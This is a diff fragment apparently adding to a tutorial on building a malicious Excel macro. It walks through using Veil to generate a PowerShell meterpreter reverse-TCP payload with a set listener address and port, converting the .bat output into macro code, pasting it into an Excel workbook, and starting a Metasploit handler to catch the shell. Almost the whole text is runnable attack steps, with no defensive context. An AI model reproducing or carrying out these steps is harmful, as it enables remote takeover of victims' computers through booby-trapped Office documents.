@@ -13,3 +13,32 @@ use 1
 list
 payload id-24
 use powershell/meterpreter/rev_tcp
+set lhost  192.168.0.122
+set lport 4444
+generate
+Enter the name of the file. Let the name of the file to be generated be “demo“. Therefore;
+
+demo
+Now, the Veil tool has created a bat file in PowerShell code in the directory:
+
+/var/lib/veil/output/source/demo.bat
+Now, open a new terminal and open veil again( using command ‘veil’) and then type:
+
+use auxiliary/macro_converter
+macro_converter converts the bat file into a readable text file. Under this, type the following commands to generate a text file:
+
+set POSH_BATCH /var/lib/veil/output/source/demo.bat
+generate
+This generates a text file in /var/lib/veil/output directory.
+Now open windows->New Microsoft  Office Excel Worksheet->view(on the top bar)->macro
+
+Enter the macro name->create
+Then in the Macro editing area(or the workbook) copy paste the code present in “demo1.txt” to the workbook and save the macro.
+----------------------------------------------------------------------------------------------------------------------
+Meanwhile, go to Kali Linux terminal and open Metasploit framework(>msfconsole) and type the following commands:
+
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost 192.168.0.122
+set lport 4444
+exploit
